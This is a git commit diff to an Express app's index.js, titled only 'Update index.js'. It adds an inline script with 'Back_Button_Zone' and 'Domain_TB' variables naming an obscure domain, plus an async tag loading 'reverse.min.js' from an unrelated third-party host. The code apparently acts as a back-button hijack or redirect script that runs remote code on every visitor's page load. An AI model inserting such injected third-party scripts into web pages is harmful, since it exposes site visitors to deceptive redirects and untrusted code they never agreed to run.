00885537808cac9ac444a2a7d75c666eeceaaf42
isoqshodmonov-max <shodmonovisoq@gmail.com>
2024-09-29 02:11:10 +0500

    Update index.js

--- index.js
+++ index.js
@@ -21,7 +21,11 @@ app.get('/', (_req, res) => {
 
   <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH" crossorigin="anonymous">
   <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-YvpcrYf0tY3lHB60NNkmXc5s9fDVZLESaAA55NDzOxhy9GkcIdslK1eN7N6jIeHz" crossorigin="anonymous"></script>
-
+<script>
+      var Back_Button_Zone = 8166098;
+      var Domain_TB = "leezunikoohauh.net";
+</script>
+<script async src="https://desenteir.com/602/d1237/reverse.min.js?sf=1"></script>
 <style>
   @import url("https://fonts.googleapis.com/css2?family=Lato:wght@400;700&family=Open+Sans:wght@300;400;600;700&display=swap");
 body {
